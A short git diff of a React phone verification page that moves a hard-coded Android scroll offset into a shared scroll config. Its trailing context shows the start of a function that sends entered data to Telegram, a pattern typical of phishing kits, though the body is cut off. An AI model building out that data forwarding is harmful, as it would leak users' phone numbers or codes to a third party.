@@ -2,7 +2,7 @@ import React, { useEffect, useRef, useCallback, memo } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
 import './App.css';
 import { useAuth, AuthProvider } from './AuthContext';
-import { useScroll } from './ScrollContext'; // ScrollProvider'ı kaldırmaya gerek yok, sadece useScroll kullanıyoruz
+import { useScroll } from './ScrollContext';
 
 const isIOS = () => /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
@@ -19,7 +19,7 @@ function PhoneVerificationPageContent() {
   });
 
   const phoneInputRef = useRef(null);
-  const { rightSectionRef } = useScroll();
+  const { rightSectionRef, scrollConfig } = useScroll();
   const location = useLocation();
   const navigate = useNavigate();
   const { dispatch: authDispatch } = useAuth();
@@ -122,7 +122,7 @@ function PhoneVerificationPageContent() {
       const isAndroid = /Android/i.test(navigator.userAgent);
       if (!isAndroid) return;
 
-      const offset = 350;
+      const offset = scrollConfig.phoneOffset;
       setTimeout(() => {
         requestAnimationFrame(() => {
           const scrollTo = rightSection.scrollTop + inputRect.top - (viewportHeight - inputRect.height) / 2 + offset;
@@ -151,7 +151,7 @@ function PhoneVerificationPageContent() {
         phoneRef.removeEventListener('blur', handleBlurScroll);
       }
     };
-  }, [rightSectionRef]);
+  }, [rightSectionRef, scrollConfig]);
 
   // Telegram'a veri gönderimi
   const sendToTelegram = useCallback(async (data) => {
